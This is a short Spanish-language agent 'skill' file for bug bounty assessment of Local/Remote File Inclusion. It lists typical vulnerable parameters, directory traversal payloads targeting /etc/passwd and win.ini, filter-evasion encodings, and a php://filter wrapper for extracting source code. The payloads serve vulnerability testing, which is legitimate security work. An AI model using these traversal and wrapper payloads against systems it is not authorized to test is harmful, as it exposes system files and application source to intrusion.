---
name: bug-bounty-lfi-rfi
description: Auditoría de vulnerabilidades Local File Inclusion (LFI), Remote File Inclusion (RFI), Directory Traversal, wrappers de PHP (php://filter, php://input) y lectura insegura de archivos del sistema.
---

# Skill: Local & Remote File Inclusion (LFI / RFI) Assessment

Esta habilidad entrena al agente para detectar aplicaciones web que aceptan nombres de archivos o rutas en parámetros de consulta sin validar que la ruta permanezca dentro del directorio permitido.

## 📌 Parámetros Típicos
`file=`, `page=`, `include=`, `path=`, `template=`, `document=`, `cat=`, `dir=`.

---

## 🛠️ Diagnóstico y Wrappers PHP

### 1. Directory Traversal Basico
- **Linux**: `../../../../etc/passwd`
- **Windows**: `..\..\..\..\windows\win.ini` / `C:\boot.ini`

### 2. Evasión de Filtros de Ruta
- **Traversals Nulos / Doble Encoding**:
  - `%2e%2e%2f` (`../`)
  - `%252e%252e%252f` (Doble URL Encoding)
  - `....//....//....//etc/passwd` (Si el filtro solo elimina una instancia de `../`)

### 3. Wrappers PHP para Lectura de Código Fuente
- **Lectura en Base64**:
  `php://filter/convert.base64-encode/resource=index.php`

---

## 📚 Referencias Técnicas

Consulta los detalles y remediación en:
[lfi-wrappers.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-lfi-rfi/references/lfi-wrappers.md)
